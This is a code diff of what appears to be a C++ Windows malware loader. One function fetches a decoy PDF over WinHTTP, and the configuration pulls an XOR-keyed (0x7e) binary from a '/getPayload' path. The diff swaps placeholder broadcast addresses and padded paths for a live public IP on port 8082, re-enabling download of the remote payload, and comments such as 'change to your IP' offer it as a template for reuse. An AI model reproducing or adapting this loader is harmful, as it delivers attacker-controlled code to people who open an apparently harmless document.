@@ -55,8 +55,8 @@ int readPDF() {
     }
 
     // Step 2: Connect to the server
-   // HINTERNET hConnect = WinHttpConnect(hSession, L"103.182.16.8", 8082, 0);
-    HINTERNET hConnect = WinHttpConnect(hSession, L"255.255.255.255", 8082, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, L"103.182.16.8", 8082, 0);
+    //HINTERNET hConnect = WinHttpConnect(hSession, L"255.255.255.255", 8082, 0);
     if (hConnect == NULL) {
         std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
         WinHttpCloseHandle(hSession);
@@ -64,8 +64,8 @@ int readPDF() {
     }
 
     // Step 3: Create request to download PDF file
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
-    //HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    //HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdfgetpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/getpdf", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
     if (hRequest == NULL) {
         std::cerr << "WinHttpOpenRequest failed: " << GetLastError() << std::endl;
         WinHttpCloseHandle(hConnect);
@@ -139,11 +139,11 @@ int main()
     readPDF();
 
     //--------- CONFIGURE -----------
-    //LPCWSTR remotehost = L"103.182.16.8"; //change to your IP
-    LPCWSTR remotehost = L"254.254.254.254"; //change to your IP
+    LPCWSTR remotehost = L"103.182.16.8"; //change to your IP
+    //LPCWSTR remotehost = L"254.254.254.254"; //change to your IP
     int remoteport = 8082; //change to your port
-    //LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
-    LPCWSTR remotedir = L"/getPayloadgetPayloadgetPayloadgetPayloadgetPayloadgetPayload"; //change to your directory of the hosted bin file
+    LPCWSTR remotedir = L"/getPayload"; //change to your directory of the hosted bin file
+    //LPCWSTR remotedir = L"/getPayloadgetPayloadgetPayloadgetPayloadgetPayloadgetPayload"; //change to your directory of the hosted bin file
     unsigned char key = 0x7e; //change to your key
     //-------------------------------
 
